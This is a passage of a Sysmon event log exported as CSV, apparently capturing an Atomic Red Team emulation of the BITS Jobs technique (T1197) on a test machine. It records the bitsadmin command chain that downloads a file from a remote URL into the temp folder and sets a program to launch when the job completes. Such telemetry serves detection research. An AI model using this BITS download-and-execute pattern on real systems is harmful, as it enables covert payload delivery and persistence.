Microsoft-Windows-Sysmon/Operational,bitsadmin.exe  /addfile AtomicBITS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\Users\User\AppData\Local\Temp\bitsadmin3_flag.ps1 ,Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,BITS administration utility,1,19586,7.8.22621.1 (WinBuild.160101.0800),"MD5=C62B04C717A3CCF25D0C44BA97C2A6AA,SHA256=7C2365B752F8D2708C737BC34260D5F3D1568FDD2E12892D3CA3E4952ADD0230,IMPHASH=0CAC68DC73A62CA8C76038194D54BF79",C:\Windows\System32\bitsadmin.exe,Medium,0x8000000000000000,Information,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,"Process Create:

RuleName: -

UtcTime: 2023-12-27 22:18:21.050

ProcessGuid: {f57bd86a-a2ad-658c-d101-000000000f00}

ProcessId: 6148

Image: C:\Windows\System32\bitsadmin.exe

FileVersion: 7.8.22621.1 (WinBuild.160101.0800)

Description: BITS administration utility

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: bitsadmin.exe

CommandLine: bitsadmin.exe  /addfile AtomicBITS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\Users\User\AppData\Local\Temp\bitsadmin3_flag.ps1 

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=C62B04C717A3CCF25D0C44BA97C2A6AA,SHA256=7C2365B752F8D2708C737BC34260D5F3D1568FDD2E12892D3CA3E4952ADD0230,IMPHASH=0CAC68DC73A62CA8C76038194D54BF79

ParentProcessGuid: {f57bd86a-a2ac-658c-ce01-000000000f00}

ParentProcessId: 10092

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""cmd.exe"" /c bitsadmin.exe /create AtomicBITS & bitsadmin.exe /addfile AtomicBITS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md %temp%\bitsadmin3_flag.ps1 & bitsadmin.exe /setnotifycmdline AtomicBITS C:\Windows\system32\notepad.exe NULL & bitsadmin.exe /resume AtomicBITS & ping -n 5 127.0.0.1 >nul 2>&1 & bitsadmin.exe /complete AtomicBITS

ParentUser: WINDEV2309EVAL\User",Info,bitsadmin.exe,"""cmd.exe"" /c bitsadmin.exe /create AtomicBITS & bitsadmin.exe /addfile AtomicBITS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md %temp%\bitsadmin3_flag.ps1 & bitsadmin.exe /setnotifycmdline AtomicBITS C:\Windows\system32\notepad.exe NULL & bitsadmin.exe /resume AtomicBITS & ping -n 5 127.0.0.1 >nul 2>&1 & bitsadmin.exe /complete AtomicBITS",C:\Windows\System32\cmd.exe,{f57bd86a-a2ac-658c-ce01-000000000f00},10092,WINDEV2309EVAL\User,{f57bd86a-a2ad-658c-d101-000000000f00},3588,6148,Microsoft® Windows® Operating System,,,,"
      ",-,2023-12-27T22:18:21.0508721Z,,Process Create (rule: ProcessCreate),1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 22:18:21.050,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T22:18:21.0508721Z""/>
      <EventRecordID>19586</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 22:18:21.050</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-a2ad-658c-d101-000000000f00}</Data>
      <Data Name=""ProcessId"">6148</Data>
      <Data Name=""Image"">C:\Windows\System32\bitsadmin.exe</Data>
      <Data Name=""FileVersion"">7.8.22621.1 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">BITS administration utility</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">bitsadmin.exe</Data>
      <Data Name=""CommandLine"">bitsadmin.exe  /addfile AtomicBITS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\Users\User\AppData\Local\Temp\bitsadmin3_flag.ps1 </Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=C62B04C717A3CCF25D0C44BA97C2A6AA,SHA256=7C2365B752F8D2708C737BC34260D5F3D1568FDD2E12892D3CA3E4952ADD0230,IMPHASH=0CAC68DC73A62CA8C76038194D54BF79</Data>
      <Data Name=""ParentProcessGuid"">{f57bd86a-a2ac-658c-ce01-000000000f00}</Data>
      <Data Name=""ParentProcessId"">10092</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\cmd.exe</Data>
      <Data Name=""ParentCommandLine"">""cmd.exe"" /c bitsadmin.exe /create AtomicBITS &amp; bitsadmin.exe /addfile AtomicBITS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md %temp%\bitsadmin3_flag.ps1 &amp; bitsadmin.exe /setnotifycmdline AtomicBITS C:\Windows\system32\notepad.exe NULL &amp; bitsadmin.exe /resume AtomicBITS &amp; ping -n 5 127.0.0.1 &gt;nul 2&gt;&amp;1 &amp; bitsadmin.exe /complete AtomicBITS</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 22:18:21.050

ProcessGuid: {f57bd86a-a2ad-658c-d101-000000000f00}

ProcessId: 6148

Image: C:\Windows\System32\bitsadmin.exe

FileVersion: 7.8.22621.1 (WinBuild.160101.0800)

Description: BITS administration utility

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: bitsadmin.exe

CommandLine: bitsadmin.exe  /addfile AtomicBITS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\Users\User\AppData\Local\Temp\bitsadmin3_flag.ps1 

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=C62B04C717A3CCF25D0C44BA97C2A6AA,SHA256=7C2365B752F8D2708C737BC34260D5F3D1568FDD2E12892D3CA3E4952ADD0230,IMPHASH=0CAC68DC73A62CA8C76038194D54BF79

ParentProcessGuid: {f57bd86a-a2ac-658c-ce01-000000000f00}

ParentProcessId: 10092

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""cmd.exe"" /c bitsadmin.exe /create AtomicBITS &amp; bitsadmin.exe /addfile AtomicBITS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md %temp%\bitsadmin3_flag.ps1 &amp; bitsadmin.exe /setnotifycmdline AtomicBITS C:\Windows\system32\notepad.exe NULL &amp; bitsadmin.exe /resume AtomicBITS &amp; ping -n 5 127.0.0.1 &gt;nul 2&gt;&amp;1 &amp; bitsadmin.exe /complete AtomicBITS

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,bitsadmin.exe  /create AtomicBITS ,Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,BITS administration utility,1,19585,7.8.22621.1 (WinBuild.160101.0800),"MD5=C62B04C717A3CCF25D0C44BA97C2A6AA,SHA256=7C2365B752F8D2708C737BC34260D5F3D1568FDD2E12892D3CA3E4952ADD0230,IMPHASH=0CAC68DC73A62CA8C76038194D54BF79",C:\Windows\System32\bitsadmin.exe,Medium,0x8000000000000000,Information,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,"Process Create:

RuleName: -

UtcTime: 2023-12-27 22:18:21.019

ProcessGuid: {f57bd86a-a2ad-658c-d001-000000000f00}

ProcessId: 3836

Image: C:\Windows\System32\bitsadmin.exe

FileVersion: 7.8.22621.1 (WinBuild.160101.0800)

Description: BITS administration utility

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: bitsadmin.exe

CommandLine: bitsadmin.exe  /create AtomicBITS 

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=C62B04C717A3CCF25D0C44BA97C2A6AA,SHA256=7C2365B752F8D2708C737BC34260D5F3D1568FDD2E12892D3CA3E4952ADD0230,IMPHASH=0CAC68DC73A62CA8C76038194D54BF79

ParentProcessGuid: {f57bd86a-a2ac-658c-ce01-000000000f00}

ParentProcessId: 10092

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""cmd.exe"" /c bitsadmin.exe /create AtomicBITS & bitsadmin.exe /addfile AtomicBITS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md %temp%\bitsadmin3_flag.ps1 & bitsadmin.exe /setnotifycmdline AtomicBITS C:\Windows\system32\notepad.exe NULL & bitsadmin.exe /resume AtomicBITS & ping -n 5 127.0.0.1 >nul 2>&1 & bitsadmin.exe /complete AtomicBITS

ParentUser: WINDEV2309EVAL\User",Info,bitsadmin.exe,"""cmd.exe"" /c bitsadmin.exe /create AtomicBITS & bitsadmin.exe /addfile AtomicBITS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md %temp%\bitsadmin3_flag.ps1 & bitsadmin.exe /setnotifycmdline AtomicBITS C:\Windows\system32\notepad.exe NULL & bitsadmin.exe /resume AtomicBITS & ping -n 5 127.0.0.1 >nul 2>&1 & bitsadmin.exe /complete AtomicBITS",C:\Windows\System32\cmd.exe,{f57bd86a-a2ac-658c-ce01-000000000f00},10092,WINDEV2309EVAL\User,{f57bd86a-a2ad-658c-d001-000000000f00},3588,3836,Microsoft® Windows® Operating System,,,,"
      ",-,2023-12-27T22:18:21.0203597Z,,Process Create (rule: ProcessCreate),1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 22:18:21.019,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T22:18:21.0203597Z""/>
      <EventRecordID>19585</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 22:18:21.019</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-a2ad-658c-d001-000000000f00}</Data>
      <Data Name=""ProcessId"">3836</Data>
      <Data Name=""Image"">C:\Windows\System32\bitsadmin.exe</Data>
      <Data Name=""FileVersion"">7.8.22621.1 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">BITS administration utility</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">bitsadmin.exe</Data>
      <Data Name=""CommandLine"">bitsadmin.exe  /create AtomicBITS </Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=C62B04C717A3CCF25D0C44BA97C2A6AA,SHA256=7C2365B752F8D2708C737BC34260D5F3D1568FDD2E12892D3CA3E4952ADD0230,IMPHASH=0CAC68DC73A62CA8C76038194D54BF79</Data>
      <Data Name=""ParentProcessGuid"">{f57bd86a-a2ac-658c-ce01-000000000f00}</Data>
      <Data Name=""ParentProcessId"">10092</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\cmd.exe</Data>
      <Data Name=""ParentCommandLine"">""cmd.exe"" /c bitsadmin.exe /create AtomicBITS &amp; bitsadmin.exe /addfile AtomicBITS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md %temp%\bitsadmin3_flag.ps1 &amp; bitsadmin.exe /setnotifycmdline AtomicBITS C:\Windows\system32\notepad.exe NULL &amp; bitsadmin.exe /resume AtomicBITS &amp; ping -n 5 127.0.0.1 &gt;nul 2&gt;&amp;1 &amp; bitsadmin.exe /complete AtomicBITS</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 22:18:21.019

ProcessGuid: {f57bd86a-a2ad-658c-d001-000000000f00}

ProcessId: 3836

Image: C:\Windows\System32\bitsadmin.exe

FileVersion: 7.8.22621.1 (WinBuild.160101.0800)

Description: BITS administration utility

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: bitsadmin.exe

CommandLine: bitsadmin.exe  /create AtomicBITS 

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=C62B04C717A3CCF25D0C44BA97C2A6AA,SHA256=7C2365B752F8D2708C737BC34260D5F3D1568FDD2E12892D3CA3E4952ADD0230,IMPHASH=0CAC68DC73A62CA8C76038194D54BF79

ParentProcessGuid: {f57bd86a-a2ac-658c-ce01-000000000f00}

ParentProcessId: 10092

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""cmd.exe"" /c bitsadmin.exe /create AtomicBITS &amp; bitsadmin.exe /addfile AtomicBITS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md %temp%\bitsadmin3_flag.ps1 &amp; bitsadmin.exe /setnotifycmdline AtomicBITS C:\Windows\system32\notepad.exe NULL &amp; bitsadmin.exe /resume AtomicBITS &amp; ping -n 5 127.0.0.1 &gt;nul 2&gt;&amp;1 &amp; bitsadmin.exe /complete AtomicBITS

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""cmd.exe"" /c bitsadmin.exe /create AtomicBITS & bitsadmin.exe /addfile AtomicBITS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md %%temp%%\bitsadmin3_flag.ps1 & bitsadmin.exe /setnotifycmdline AtomicBITS C:\Windows\system32\notepad.exe NULL & bitsadmin.exe /resume AtomicBITS & ping -n 5 127.0.0.1 >nul 2>&1 & bitsadmin.exe /complete AtomicBITS",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows Command Processor,1,19584,10.0.22621.2506 (WinBuild.160101.0800),"MD5=133D568ECCB557E37BEA1459521CBAC2,SHA256=05A30592D2C3421C41121145C6EEFA7C81FEA6B42D6233A522240A8468326B9C,IMPHASH=D73E39DAB3C8B57AA408073D01254964",C:\Windows\System32\cmd.exe,Medium,0x8000000000000000,Information,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,"Process Create:

RuleName: -

UtcTime: 2023-12-27 22:18:20.992

ProcessGuid: {f57bd86a-a2ac-658c-ce01-000000000f00}

ProcessId: 10092

Image: C:\Windows\System32\cmd.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: Windows Command Processor

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: Cmd.Exe

CommandLine: ""cmd.exe"" /c bitsadmin.exe /create AtomicBITS & bitsadmin.exe /addfile AtomicBITS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md %%temp%%\bitsadmin3_flag.ps1 & bitsadmin.exe /setnotifycmdline AtomicBITS C:\Windows\system32\notepad.exe NULL & bitsadmin.exe /resume AtomicBITS & ping -n 5 127.0.0.1 >nul 2>&1 & bitsadmin.exe /complete AtomicBITS

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=133D568ECCB557E37BEA1459521CBAC2,SHA256=05A30592D2C3421C41121145C6EEFA7C81FEA6B42D6233A522240A8468326B9C,IMPHASH=D73E39DAB3C8B57AA408073D01254964

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 1688

ParentImage: -

ParentCommandLine: -

ParentUser: -",Info,Cmd.Exe,-,-,{00000000-0000-0000-0000-000000000000},1688,-,{f57bd86a-a2ac-658c-ce01-000000000f00},3588,10092,Microsoft® Windows® Operating System,,,,"
      ",-,2023-12-27T22:18:20.9952183Z,,Process Create (rule: ProcessCreate),1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 22:18:20.992,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T22:18:20.9952183Z""/>
      <EventRecordID>19584</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 22:18:20.992</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-a2ac-658c-ce01-000000000f00}</Data>
      <Data Name=""ProcessId"">10092</Data>
      <Data Name=""Image"">C:\Windows\System32\cmd.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Windows Command Processor</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">Cmd.Exe</Data>
      <Data Name=""CommandLine"">""cmd.exe"" /c bitsadmin.exe /create AtomicBITS &amp; bitsadmin.exe /addfile AtomicBITS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md %%temp%%\bitsadmin3_flag.ps1 &amp; bitsadmin.exe /setnotifycmdline AtomicBITS C:\Windows\system32\notepad.exe NULL &amp; bitsadmin.exe /resume AtomicBITS &amp; ping -n 5 127.0.0.1 &gt;nul 2&gt;&amp;1 &amp; bitsadmin.exe /complete AtomicBITS</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=133D568ECCB557E37BEA1459521CBAC2,SHA256=05A30592D2C3421C41121145C6EEFA7C81FEA6B42D6233A522240A8468326B9C,IMPHASH=D73E39DAB3C8B57AA408073D01254964</Data>
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      <Data Name=""ParentProcessId"">1688</Data>
      <Data Name=""ParentImage"">-</Data>
      <Data Name=""ParentCommandLine"">-</Data>
      <Data Name=""ParentUser"">-</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 22:18:20.992

ProcessGuid: {f57bd86a-a2ac-658c-ce01-000000000f00}

ProcessId: 10092

Image: C:\Windows\System32\cmd.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: Windows Command Processor

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: Cmd.Exe

CommandLine: ""cmd.exe"" /c bitsadmin.exe /create AtomicBITS &amp; bitsadmin.exe /addfile AtomicBITS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md %%temp%%\bitsadmin3_flag.ps1 &amp; bitsadmin.exe /setnotifycmdline AtomicBITS C:\Windows\system32\notepad.exe NULL &amp; bitsadmin.exe /resume AtomicBITS &amp; ping -n 5 127.0.0.1 &gt;nul 2&gt;&amp;1 &amp; bitsadmin.exe /complete AtomicBITS

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=133D568ECCB557E37BEA1459521CBAC2,SHA256=05A30592D2C3421C41121145C6EEFA7C81FEA6B42D6233A522240A8468326B9C,IMPHASH=D73E39DAB3C8B57AA408073D01254964

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 1688

ParentImage: -

ParentCommandLine: -

ParentUser: -</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-27 22:18:20.144,,,11,19583,,,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe,,0x8000000000000000,Information,,,"File created:

RuleName: DLL

UtcTime: 2023-12-27 22:18:20.241

ProcessGuid: {f57bd86a-a2ac-658c-cc01-000000000f00}

ProcessId: 11596

Image: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\rqzdeuqm.dll

CreationUtcTime: 2023-12-27 22:18:20.144

User: WINDEV2309EVAL\User",Info,,,,,,,{f57bd86a-a2ac-658c-cc01-000000000f00},3588,11596,,,,,"
      ",DLL,2023-12-27T22:18:20.2511032Z,C:\Users\User\AppData\Local\Temp\rqzdeuqm.dll,File created (rule: FileCreate),,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 22:18:20.241,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>11</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>11</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T22:18:20.2511032Z""/>
      <EventRecordID>19583</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">DLL</Data>
      <Data Name=""UtcTime"">2023-12-27 22:18:20.241</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-a2ac-658c-cc01-000000000f00}</Data>
      <Data Name=""ProcessId"">11596</Data>
      <Data Name=""Image"">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe</Data>
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Local\Temp\rqzdeuqm.dll</Data>
      <Data Name=""CreationUtcTime"">2023-12-27 22:18:20.144</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>File created:

RuleName: DLL

UtcTime: 2023-12-27 22:18:20.241

ProcessGuid: {f57bd86a-a2ac-658c-cc01-000000000f00}

ProcessId: 11596

Image: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\rqzdeuqm.dll

CreationUtcTime: 2023-12-27 22:18:20.144

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>File created (rule: FileCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\User\AppData\Local\Temp\RES28F0.tmp"" ""c:\Users\User\AppData\Local\Temp\CSC4340BCFC3A014F09B6A5EEBE9BE1DA51.TMP""",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Microsoft® Resource File To COFF Object Conversion Utility,1,19582,14.32.31326.0,"MD5=8166CCB6A04B855AA918B36079C63B7D,SHA256=FD3EF1B4C91B2E85CCD05724A7CD527A3A27D7D549B0DCDB70D3D78BE120C560,IMPHASH=45A00F7304B8F089973962FBEF618959",C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe,Medium,0x8000000000000000,Information,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,"Process Create:

RuleName: -

UtcTime: 2023-12-27 22:18:20.238

ProcessGuid: {f57bd86a-a2ac-658c-cd01-000000000f00}

ProcessId: 5020

Image: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe

FileVersion: 14.32.31326.0

Description: Microsoft® Resource File To COFF Object Conversion Utility

Product: Microsoft® .NET Framework

Company: Microsoft Corporation

OriginalFileName: CVTRES.EXE

CommandLine: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\User\AppData\Local\Temp\RES28F0.tmp"" ""c:\Users\User\AppData\Local\Temp\CSC4340BCFC3A014F09B6A5EEBE9BE1DA51.TMP""

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=8166CCB6A04B855AA918B36079C63B7D,SHA256=FD3EF1B4C91B2E85CCD05724A7CD527A3A27D7D549B0DCDB70D3D78BE120C560,IMPHASH=45A00F7304B8F089973962FBEF618959

ParentProcessGuid: {f57bd86a-a2ac-658c-cc01-000000000f00}

ParentProcessId: 11596

ParentImage: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe

ParentCommandLine: ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\User\AppData\Local\Temp\rqzdeuqm.cmdline""

ParentUser: WINDEV2309EVAL\User",Info,CVTRES.EXE,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\User\AppData\Local\Temp\rqzdeuqm.cmdline""",C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe,{f57bd86a-a2ac-658c-cc01-000000000f00},11596,WINDEV2309EVAL\User,{f57bd86a-a2ac-658c-cd01-000000000f00},3588,5020,Microsoft® .NET Framework,,,,"
      ",-,2023-12-27T22:18:20.2389976Z,,Process Create (rule: ProcessCreate),1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 22:18:20.238,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T22:18:20.2389976Z""/>
      <EventRecordID>19582</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
